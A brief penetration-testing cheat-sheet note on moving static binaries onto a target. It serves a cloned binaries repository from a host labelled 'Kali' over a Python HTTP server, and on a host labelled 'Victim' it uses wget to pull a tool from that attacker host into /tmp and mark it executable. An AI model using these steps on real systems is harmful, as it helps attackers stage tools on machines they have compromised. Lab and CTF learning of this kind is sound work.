# Static Binaries

## Static Binary Repo

I made a branched of it just in case

[https://github.com/JeffGThompson/static-binaries](https://github.com/JeffGThompson/static-binaries)

**Kali**

```
git clone https://github.com/andrew-d/static-binaries.git
cd static-binaries/binaries/$lookForBinaryYouWant/
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp/
wget http://$KALI:81/$binaryYouWant
chmod +x $binaryYouWant
```
